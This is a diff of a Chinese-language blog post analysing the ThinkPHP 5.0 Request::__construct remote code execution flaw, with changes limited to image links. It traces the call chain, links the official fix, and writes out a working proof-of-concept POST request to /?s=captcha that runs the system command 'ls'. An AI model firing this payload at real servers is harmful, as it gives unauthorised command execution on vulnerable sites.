@@ -196,15 +196,15 @@
 <p><code>check</code>方法内</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method());</span><br></pre></td></tr></table></figure>
 
-<p>跟进method<br><img src="https://uploader.shimo.im/f/lMYQlNvoXEQ1zRV2.png!thumbnail" alt="图片"></p>
+<p>跟进method<br><img src="https://i.loli.net/2019/12/02/sbTJmpEPABhRUtl.png" alt="image.png"></p>
 <p>config.php中定义了var_method = _method</p>
-<p><img src="https://uploader.shimo.im/f/Fol9F8y5ILkOccmB.png!thumbnail" alt="图片"></p>
+<p><img src="https://i.loli.net/2019/12/02/gNVOThj8aIxmJto.png" alt="image.png"></p>
 <p>当post存在<code>_method</code>参数时，会执行<code>$this-&gt;{$this-&gt;**method**}($_POST);</code></p>
 <p><code>$this-&gt;method</code> 是_method的值，也就是执行了<code>$this-&gt;__construct($_POST)</code></p>
 <p>传入的<code>__construct</code>让Request类内的成员全部被覆盖了</p>
 <p>__construct 函数不贴了</p>
 <p><code>/vendor/topthink/think-captcha/src/help.php</code></p>
-<p><img src="https://uploader.shimo.im/f/aJPtdIPRPMYlzcII.png!thumbnail" alt="图片"></p>
+<p><img src="https://i.loli.net/2019/12/02/UlLEYuXZdObVNjB.png" alt="image.png"></p>
 <p>?s=captcha 注册了路由,使得dispatch[“type”]=”method”</p>
 <p>接着</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = self::exec($dispatch, $config);</span><br></pre></td></tr></table></figure>
@@ -246,7 +246,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">"system"</span>, <span class="string">"ls"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>整个调用链</p>
-<p><img src="https://uploader.shimo.im/f/LxnGlQVIa8EUJBHh.png!thumbnail" alt="图片"></p>
+<p><img src="https://i.loli.net/2019/12/02/AO5H4ukZSWqLVxo.png" alt="image.png"></p>
 <h2 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls</span><br></pre></td></tr></table></figure>
 
 <p>param 方法执行不一样</p>
@@ -271,11 +271,11 @@
 <p><code>$data = array(&#39;ls&#39;,id=&gt;null)</code><br>执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterValue(&amp;$value, $key, $filters)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://uploader.shimo.im/f/upcqeHG6sTk4TLSr.png!thumbnail" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/SrMBADWsPeMHTIBn.png!thumbnail" alt="图片"></p>
+<p><img src="https://i.loli.net/2019/12/02/SQV5DFNW2zGfKZT.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2019/12/02/4TxBwkNu6RHgnPX.png" alt="image.png"></p>
 <p>整个调用</p>
 <h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></p>
-<p><img src="https://uploader.shimo.im/f/MWHMVkpcYQ8DmcQb.png!thumbnail" alt="图片"></p>
+<p><img src="https://i.loli.net/2019/12/02/Rd8JI2StvgOacl9.png" alt="image.png"></p>
 <p>将执行Request任意方法，改成了指定的白名单内的，</p>
 <p>执行任意方法确实会出事orz</p>
 
